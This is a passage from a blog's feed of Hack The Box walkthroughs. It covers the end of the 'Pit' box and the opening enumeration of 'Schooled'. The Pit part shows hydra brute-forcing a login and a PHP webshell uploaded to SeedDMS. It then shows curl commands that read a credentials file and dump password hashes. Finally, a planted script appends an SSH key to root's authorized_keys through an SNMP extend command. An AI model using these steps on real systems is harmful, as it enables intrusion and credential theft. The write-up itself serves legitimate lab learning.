                </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 <span class="s2">"</span><span class="nv">$host</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> whatweb_enum.txt
        <span class="k">done
done</span>
</code></pre></div></div>

<p>Inspecting the results, found something interesting: when we call the domain <code class="language-plaintext highlighter-rouge">dms-pit.htb</code> we get a <strong>403 Forbidden</strong> response, the ideal scenario to leverage the SSRF vuln in Cockpit, if present :smile:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]
</code></pre></div></div>

<p>Making some tests based on the PoC Seen, noticed that the “Connect to” field mentioned isn’t available. Also, checking the PoC videos, noticed that the version we’re running is updated and no longer vulnerable, also confirmed issuing some requests to <code class="language-plaintext highlighter-rouge">/cockpit</code> and don’t succeeding :disappointed:.</p>

<p>Based on that, started to enumerate again, both running a <code class="language-plaintext highlighter-rouge">nmap</code> scan for all TCP ports and quick UDP scan as well, to check if we’re missing something here. Also started a gobuster enumeration on <code class="language-plaintext highlighter-rouge">http://10.10.10.241</code> to check for any published website on it.</p>

<p>After some time waiting, <code class="language-plaintext highlighter-rouge">gobuster</code> unfortunately resulted in nothing, as well as TCP for all ports, not showing anything different than we already saw in the quick scan. Surprisingly the UDP scan displayed listed two open ports, as results below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">-vv</span> <span class="nt">-oA</span> quick_udp 10.10.10.241
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 13:53 <span class="nt">-03</span>
NSE: Loaded 45 scripts <span class="k">for </span>scanning.
Initiating Ping Scan at 13:53
Scanning 10.10.10.241 <span class="o">[</span>4 ports]
Completed Ping Scan at 13:53, 0.10s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating UDP Scan at 13:53
Increasing send delay <span class="k">for </span>10.10.10.241 from 800 to 1000 due to 37 out of 121 dropped probes since last increase.
Warning: 10.10.10.241 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>dms-pit.htb <span class="o">(</span>10.10.10.241<span class="o">)</span>
Host is up, received echo-reply ttl 63 <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-08-10 13:53:34 <span class="nt">-03</span> <span class="k">for </span>1081s
Not shown: 998 filtered ports
Reason: 979 admin-prohibiteds and 19 host-unreaches
PORT      STATE         SERVICE REASON       VERSION
161/udp   open          snmp    udp-response SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
20762/udp open|filtered unknown no-response
Service Info: Host: pit.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
</code></pre></div></div>

<h3 id="161udp---snmp-service">161/UDP - SNMP Service</h3>

<p>Starting with the SNMP Service, ran <code class="language-plaintext highlighter-rouge">snmp-check</code> and obtained some information from the system and running processes but with a simple run couldn’t obtain much information that could lead us further like passwords, secrets, etc.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmp-check 10.10.10.241
</code></pre></div></div>

<p>Using another tool, <code class="language-plaintext highlighter-rouge">snmpwalk</code>, as recommended in <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#from-snmp-to-rce">this page</a>, noticed that this tool can enumerate identifiers and specific OIDs (Object Identifiers) but, with the provided information not much data was also retrieved, allowing us to enumerate the accounts in the system, among other information (as well as the processes previously listed.)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       345Mi       3.1Gi       8.0Mi       452Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 13:33:08 up 37 min,  0 users,  load average: 0.19, 0.10, 0.18
</code></pre></div></div>

<p>Searching for other opportunities to enumerate SNMP devices, came across this page <a href="https://lrodrigo.sgs.lncc.br/wp/dicas/smnpcomandos-disponiveis-no-linux/snmpcomandos-snmpwalk/">SNMP:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br)</a> talking about some commands also using <code class="language-plaintext highlighter-rouge">snmpwalk</code>. The interesting here is that if you specify the OID until certain point, it lists all information about it, as SNMP works like a tree like the image below, extracted from Wikimedia.org:</p>

<p><img src="https://i.imgur.com/Gb2LBgj.png" alt="HTB Pit - SNMP Tree - source: wikimedia.org" /></p>

<p>Once the root (in red on the image) doesn’t change, decided to run <code class="language-plaintext highlighter-rouge">snmpwalk</code> once again, but specifying from where I wanted to inspect, which was <strong>right from the root</strong> (.1) and then filtered the empty values, using the command below”</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.10.10.241  .1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\"\"</span><span class="s2">$"</span>
</code></pre></div></div>

<p>Things got interesting when reviewing the output where, right after the process’s lists, an OID <strong>.1.3.6.1.4.1.2021</strong> was displaying some nginx information, previously unseen based on previous enumerations, one of them mentioning the path <code class="language-plaintext highlighter-rouge">/var/www/html/seeddms51x/seeddms</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iso.3.6.1.4.1.2021.2.1.1.1 = INTEGER: 1
iso.3.6.1.4.1.2021.2.1.2.1 = STRING: "nginx"
iso.3.6.1.4.1.2021.2.1.3.1 = INTEGER: 1
iso.3.6.1.4.1.2021.2.1.4.1 = INTEGER: 0
iso.3.6.1.4.1.2021.2.1.5.1 = INTEGER: 3
iso.3.6.1.4.1.2021.2.1.100.1 = INTEGER: 0
iso.3.6.1.4.1.2021.2.1.102.1 = INTEGER: 0
iso.3.6.1.4.1.2021.9.1.1.1 = INTEGER: 1
iso.3.6.1.4.1.2021.9.1.1.2 = INTEGER: 2
iso.3.6.1.4.1.2021.9.1.2.1 = STRING: "/"
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
iso.3.6.1.4.1.2021.9.1.3.1 = STRING: "/dev/mapper/cl-root"
iso.3.6.1.4.1.2021.9.1.3.2 = STRING: "/dev/mapper/cl-seeddms"
iso.3.6.1.4.1.2021.9.1.4.1 = INTEGER: 10000
iso.3.6.1.4.1.2021.9.1.4.2 = INTEGER: 100000
iso.3.6.1.4.1.2021.9.1.5.1 = INTEGER: -1
iso.3.6.1.4.1.2021.9.1.5.2 = INTEGER: -1
iso.3.6.1.4.1.2021.9.1.6.1 = INTEGER: 2611200
iso.3.6.1.4.1.2021.9.1.6.2 = INTEGER: 125600
iso.3.6.1.4.1.2021.9.1.7.1 = INTEGER: 374736
</code></pre></div></div>

<p>Switched back to browser and navigated to all domains appending the path we have found, and the <strong>SeedDMS</strong> portal was accessible via <code class="language-plaintext highlighter-rouge">http://dms-pit.htb/seeddms51x/seeddms</code> as we can see below</p>

<p><img src="https://i.imgur.com/PsX5dm0.png" alt="HTB Pit - SeedDMS" class="align-center" /></p>

<h2 id="initial-access">Initial access</h2>

<p>Giving a quick check in <code class="language-plaintext highlighter-rouge">searchsploit</code> found some existing exploits for this app but all of them requires us to be authenticated to work.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit seeddms
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Seeddms 5.1.10 - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Authenticated<span class="o">)</span>       | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                      | php/webapps/48324.txt
SeedDMS &lt; 5.1.11 - <span class="s1">'out.GroupMgr.php'</span> Cross-Site Scripting            | php/webapps/47024.txt
SeedDMS &lt; 5.1.11 - <span class="s1">'out.UsrMgr.php'</span> Cross-Site Scripting              | php/webapps/47023.txt
SeedDMS versions &lt; 5.1.11 - Remote Command Execution                  | php/webapps/47022.txt
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<p>As we have some usernames and this is half of the answer, obtained from <code class="language-plaintext highlighter-rouge">snmpwalk</code> scans where <strong>michelle</strong> was found, we can try to guess or brute-force it using <code class="language-plaintext highlighter-rouge">hydra</code>, where we interestingly found the password as the same as the username:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> michelle <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt dms-pit.htb http-post-form <span class="s2">"/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:Error"</span> <span class="nt">-t</span> 10
Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-08-10 16:05:20
<span class="o">[</span>DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~1434440 tries per task
<span class="o">[</span>DATA] attacking http-post-form://dms-pit.htb:80/seeddms51x/seeddms/op/op.Login.php:login<span class="o">=</span>^USER^&amp;pwd<span class="o">=</span>^PASS^&amp;lang<span class="o">=</span>:Error
<span class="o">[</span>80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle
1 of 1 target successfully completed, 1 valid password found
Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-08-10 16:05:24
</code></pre></div></div>

<p>Now that we have access to SeedDMS, we can use it to exploit the vulnerability, which, after uploading a php document, in this case a simple webshell (<code class="language-plaintext highlighter-rouge">&lt;?php system($_GET["cmd"]); ?&gt;</code>), we were able to execute commands using <code class="language-plaintext highlighter-rouge">curl</code> leveraging the Document ID of the uploaded file, in this case <strong>31</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/31/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=id'</span>
<span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>Besides having now RCE machine, every reverse shell command I try fails. I have tried several ways (bash, python, external payload, etc) and none of them worked, possibly due to SELinux enabled on the box. Based on that, decided to use the webshell to enumerate the system.</p>

<p>Checking <a href="https://github.com/JustLikeIcarus/SeedDMS/blob/master/conf/settings.xml.template">SeedDMS project page on GitHub</a>, identified that there’s a <code class="language-plaintext highlighter-rouge">/conf/settings.xml</code> file which contains the credentials to the database, which could be reused for other users in the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/33/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=cat /var/www/html/seeddms51x/conf/settings.xml'</span> | <span class="nb">grep </span>database
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11933    0 11933    0     0  77993      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 77993
    &lt;edition <span class="nv">strictFormCheck</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">viewOnlineFileTypes</span><span class="o">=</span><span class="s2">".txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg"</span> <span class="nv">enableConverting</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableEmail</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableUsersView</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableFullSearch</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableClipboard</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableFolderTree</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">expandFolderTree</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">enableLanguageSelector</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">stopWordsFile</span><span class="o">=</span><span class="s2">""</span> <span class="nv">sortUsersInList</span><span class="o">=</span><span class="s2">""</span> <span class="nv">enableDropUpload</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableRecursiveCount</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">maxRecursiveCount</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">enableThemeSelector</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">fullSearchEngine</span><span class="o">=</span><span class="s2">"sqlitefts"</span> <span class="nv">sortFoldersDefault</span><span class="o">=</span><span class="s2">"u"</span> <span class="nv">editOnlineFileTypes</span><span class="o">=</span><span class="s2">""</span> <span class="nv">enableMenuTasks</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableHelp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">defaultSearchMethod</span><span class="o">=</span><span class="s2">"database"</span> <span class="nv">libraryFolder</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">maxSizeForFullText</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">showSingleSearchHit</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableSessionList</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableDropFolderList</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableMultiUpload</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">defaultDocPosition</span><span class="o">=</span><span class="s2">"end"</span><span class="o">&gt;</span>
       - restricted: Restricted access: only allow <span class="nb">users </span>to log <span class="k">in if </span>they have an entry <span class="k">in </span>the <span class="nb">local </span>database <span class="o">(</span>irrespective of successful authentication with LDAP<span class="o">)</span><span class="nb">.</span>
       - dbDatabase: database where the tables <span class="k">for </span>seeddms are stored <span class="o">(</span>optional - see adodb-readme<span class="o">)</span>
       - dbUser: username <span class="k">for </span>database-access
       - dbPass: password <span class="k">for </span>database-access
    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">"mysql"</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">"localhost"</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">"seeddms"</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">"seeddms"</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">"ied^ieY6xoquu"</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span>
    &lt;/database&gt;
</code></pre></div></div>

<p>Using mysql command line, enumerated tables, columns and then retrieved the username, pwd and role from the users in database</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List Tables</span>
<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; select login,pwd,role from tblUsers; exit"'</span>
<span class="o">[</span>...]

<span class="c"># List Columns from tblUsers</span>
<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/34/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; show columns from tblUsers; exit"'</span>
<span class="o">[</span>...]

<span class="c"># Dump credentials</span>
<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; select login,pwd,role from tblUsers; exit"'</span>
login   <span class="nb">pwd     </span>role
admin   155dd275b4cb74bd1f80754b61148863        1
guest   NULL    2
michelle        2345f10bb948c5665ef91f6773b3e455        0
jack    682d305fdaabc156430c4c6f6f5cc65d        0
</code></pre></div></div>

<p>With the hashes, tried to crack them using <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code> but with no success.</p>

<p>As we have the database credentials, remembered that we have access to the cockpit page, where the credentials could not be validated for user <code class="language-plaintext highlighter-rouge">seeddms</code> but worked successfully for <code class="language-plaintext highlighter-rouge">michelle</code>.</p>

<p>Accessing the terminal from the web portal, was able to get the <code class="language-plaintext highlighter-rouge">user.txt</code> hash</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>michelle@pit ~]<span class="nv">$ </span><span class="nb">ls 
</span>check.sh  user.txt
<span class="o">[</span>michelle@pit ~]<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>After submitting the flag, was unable to run <code class="language-plaintext highlighter-rouge">sudo -l</code> as usually done, so started the enumeration from <code class="language-plaintext highlighter-rouge">michelle</code>’s account using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, where nothing too interesting was found besides an uncommon file containing particular privileges.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
# file: /usr/local/monitoring
USER   root      rwx
user   michelle  -wx
GROUP  root      rwx
mask             rwx
other            ---                  
</code></pre></div></div>

<p>Inspecting this file, noticed that’s actually a directory but we don’t have read access on (just write and execute according to above output). Searching for other files that makes reference to this folder, ran a recusive <code class="language-plaintext highlighter-rouge">grep</code> in the file system, where I have found a file previously found in <code class="language-plaintext highlighter-rouge">snmpwalk</code> enum..</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"/usr/local/monitoring/"</span>  / 2&gt;/dev/null
/usr/bin/monitor:for script <span class="k">in</span> /usr/local/monitoring/check<span class="k">*</span>sh
<span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="nv">$ </span><span class="nb">cat</span> /usr/bin/monitor 
<span class="c">#!/bin/bash</span>

<span class="k">for </span>script <span class="k">in</span> /usr/local/monitoring/check<span class="k">*</span>sh
<span class="k">do</span>
    /bin/bash <span class="nv">$script</span>
<span class="k">done</span>
<span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="err">$</span>
</code></pre></div></div>

<p>As we can see, this script runs any file with <code class="language-plaintext highlighter-rouge">check*.sh</code> in the directory <code class="language-plaintext highlighter-rouge">/usr/local/monitoring</code>, allowing us to run any arbitrary code from the process that starts <code class="language-plaintext highlighter-rouge">/usr/bin/monitor</code>.</p>

<p>To better understanding on how I could leverage the permission found, decided to review the recon output and found a mention to the file <code class="language-plaintext highlighter-rouge">monitor</code>, referenced as <strong>nxExtendedCommands</strong> from SNMP scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"/usr/bin/monitor"</span> <span class="nb">.</span>
./scans/snmpwalk_nsExtendObjects.txt:NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">"monitoring"</span> <span class="o">=</span> STRING: /usr/bin/monitor
./scans/snmp_full.txt:iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 <span class="o">=</span> STRING: <span class="s2">"/usr/bin/monitor"</span>
</code></pre></div></div>

<p>According to this guide <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce#getting-the-shell-from-net-snmp-extend">SNMP RCE - HackTricks</a>, if any binary is configured as nsExtendedCommand (or you’re able to add any in these settings), you can trigger its execution using <code class="language-plaintext highlighter-rouge">snmpwalk</code>.</p>

<p>Based on the gathered information, we probably have a way to gain <code class="language-plaintext highlighter-rouge">root</code>access, where the following steps were executed:</p>

<ul>
  <li>Created a <code class="language-plaintext highlighter-rouge">checkXXXX.sh</code> file, which adds a public key inside ssh’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> in the profile that runs the process and copied it to <code class="language-plaintext highlighter-rouge">/usr/bin/monitor</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="s2">"ssh-rsa &lt;base64PubKey&gt; root@kali"</span> <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
</code></pre></div></div>

<ul>
  <li>From the attacker machine, triggered the nsExtendedObject action</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Trigger Extended objects</span>
snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre></div></div>

<ul>
  <li>Right after that, connected using the corresponding private key via SSH as user <code class="language-plaintext highlighter-rouge">root</code>, where I was able to get the final flag</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> pit root@10.10.10.241
Web console: https://pit.htb:9090/

Last login: Tue Aug 10 14:50:51 2021 from 10.10.10.10
<span class="o">[</span>root@pit ~]# <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
pit.htb
<span class="o">[</span>root@pit ~]# <span class="nb">cat </span>root.txt
&lt;redacted&gt;
<span class="o">[</span>root@pit ~]#
</code></pre></div></div>

<p>I hope you guys have enjoyed!</p>

<p>See you at the next post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.]]></summary></entry><entry><title type="html">Walktrough: HTB Schooled</title><link href="https://davicruz.com/walkthrough/2021/09/htb-schooled" rel="alternate" type="text/html" title="Walktrough: HTB Schooled" /><published>2021-09-11T00:00:00-03:00</published><updated>2021-09-11T00:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/09/htb-schooled</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/09/htb-schooled"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Schooled</strong>, another medium-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/114053">TheCyberGeek</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/qw8zycI.png" alt="HTB Schooled" class="align-center" /></p>

<p>To solve this box, I was required to exploit two CVEs for a vulnerable Moodle Version, which was the hardest part once the PoC available didn’t work and spent some time understanding the required steps and then getting the initial foothold. After that, all went fine, obtaining creds from Moodle database and then abusing over-permissive <code class="language-plaintext highlighter-rouge">sudo</code> configurations.</p>

<p>I hope you guys enjoy it!</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started by running a <code class="language-plaintext highlighter-rouge">nmap</code> quick scan to see which services are currently published</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.234
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-01 14:41 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.234
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span class="o">(</span>RSA<span class="o">)</span>
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.06 seconds
</code></pre></div></div>

<p>In parallel, after the initial scan, was also able to enumerate the port 33060/TCP, resulting in the following output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-p</span> 80,33060 <span class="nt">-A</span> <span class="nt">-oA</span> Full 10.10.10.234                                                                                     
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-01 14:57 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>schooled.htb <span class="o">(</span>10.10.10.234<span class="o">)</span>
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message<span class="s2">"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"</span>
|     HY000
|   oracle-tns:
|     Invalid message-frame.<span class="s2">"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=8/1%Time=6106E084%P=x86_64-pc-linux-gnu%r(NU
